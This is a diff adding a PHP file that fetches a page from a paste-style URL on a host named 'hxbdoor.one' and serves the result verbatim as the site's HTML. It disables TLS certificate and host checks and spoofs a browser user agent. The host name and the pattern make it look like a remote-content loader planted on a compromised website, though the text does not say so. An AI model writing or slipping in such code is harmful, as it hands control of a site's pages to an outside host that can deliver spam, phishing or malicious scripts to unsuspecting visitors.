@@ -1,0 +1,26 @@
+<?php
+$url = "https://hxbdoor.one/raw/E54z2T6T";
+
+$ch = curl_init($url);
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_SSL_VERIFYHOST => false,
+    CURLOPT_TIMEOUT => 15,
+    CURLOPT_USERAGENT => "Mozilla/5.0"
+]);
+
+$result = curl_exec($ch);
+
+if ($result === false) {
+    http_response_code(500);
+    echo "cURL error: " . curl_error($ch);
+    exit;
+}
+
+curl_close($ch);
+
+/* tampilkan hasil curl sebagai HTML */
+header("Content-Type: text/html; charset=UTF-8");
+echo $result;
